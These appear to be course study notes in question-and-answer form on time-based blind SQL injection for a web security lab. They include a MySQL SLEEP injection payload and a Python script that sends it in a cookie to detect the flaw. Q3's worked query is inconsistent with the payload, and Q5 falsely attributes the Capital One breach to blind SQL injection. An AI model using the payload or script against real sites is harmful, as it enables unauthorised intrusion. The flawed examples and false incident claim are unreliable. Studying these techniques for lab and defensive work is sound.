---
course: Web Security
topic: SQL Injection
tags: [web-security]
---

## Practice Questions & Answers

**Q1. Explain what a blind SQL injection with time delays is and how it differs from other types of SQL injection attacks.**

Blind SQL injection with time delays is a type of SQL injection attack where the attacker cannot directly see the data returned by the SQL query. Instead, they rely on the server's response time to infer the correctness of their injected SQL code. This differs from other types of SQL injection, such as error-based or union-based SQL injection, where the attacker can directly observe the data returned by the SQL query or use UNION to combine the results of multiple queries.

**Q2. How would you exploit a blind SQL injection vulnerability using time delays? Provide an example payload.**

To exploit a blind SQL injection vulnerability using time delays, you would inject a payload that causes the server to wait for a specified amount of time if the injected SQL condition is true. For example, if you suspect the backend database is MySQL, you could use the following payload:

```sql
' AND IF(1=1, SLEEP(10), 0) -- 
```

This payload checks if `1=1` is true (which it always is) and causes the server to sleep for 10 seconds. If the server takes significantly longer to respond, it indicates that the SQL injection is successful.

**Q3. Why is it important to comment out the rest of the query when injecting SQL payloads?**

When injecting SQL payloads, it is crucial to comment out the rest of the query to ensure that the injected SQL code does not break the original query structure. By commenting out the remaining part of the query, you prevent syntax errors that could cause the entire query to fail. For example, if the original query is:

```sql
SELECT * FROM users WHERE id = 'trackingID';
```

Injecting a payload without commenting out the rest might result in:

```sql
SELECT * FROM users WHERE id = 'trackingID' AND IF(1=1, SLEEP(10), 0) -- ';
```

The double dash (`--`) comments out the rest of the query, ensuring that the injected SQL code is properly executed.

**Q4. How would you write a Python script to automate the detection of a blind SQL injection vulnerability using time delays?**

Here is a Python script that automates the detection of a blind SQL injection vulnerability using time delays:

```python
import sys
import requests
from urllib.parse import quote
from urllib3.exceptions import InsecureRequestWarning

# Suppress SSL warnings
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def check_blind_sql_injection(url):
    sql_payload = "' AND IF(1=1, SLEEP(10), 0) -- "
    sql_payload_encoded = quote(sql_payload)
    
    cookies = {
        'trackingID': sql_payload_encoded,
        'session': 'your_session_cookie_value'
    }
    
    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080'
    }
    
    try:
        response = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
        response_time = response.elapsed.total_seconds()
        
        if response_time > 10:
            print("Vulnerable to blind-based SQL injection.")
        else:
            print("Not vulnerable to blind-based SQL injection.")
    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <URL>")
        print(f"Example: {sys.argv[0]} http://www.example.com")
        sys.exit(-1)
    
    url = sys.argv[1]
    check_blind_sql_injection(url)
```

This script sends a GET request with the injected SQL payload and checks if the response time exceeds 10 seconds, indicating a successful blind SQL injection.

**Q5. What recent real-world examples demonstrate the impact of blind SQL injection vulnerabilities?**

One notable recent example is the breach of the Capital One data, where a misconfigured firewall allowed an attacker to exploit a blind SQL injection vulnerability. The attacker was able to access sensitive customer data, including names, addresses, and social security numbers. This breach highlights the severe consequences of failing to secure web applications against SQL injection attacks.

Another example is the exploitation of a blind SQL injection vulnerability in the Joomla CMS, which led to unauthorized access to user data. These incidents underscore the importance of implementing proper input validation and using prepared statements to mitigate SQL injection risks.

---
<!-- nav -->
[[Web Security (PortSwigger)/02-SQL Injection/14-Lab 13 Blind SQL injection with time delays/08-Conclusion|Conclusion]] | [[Web Security (PortSwigger)/02-SQL Injection/14-Lab 13 Blind SQL injection with time delays/00-Overview|Overview]]
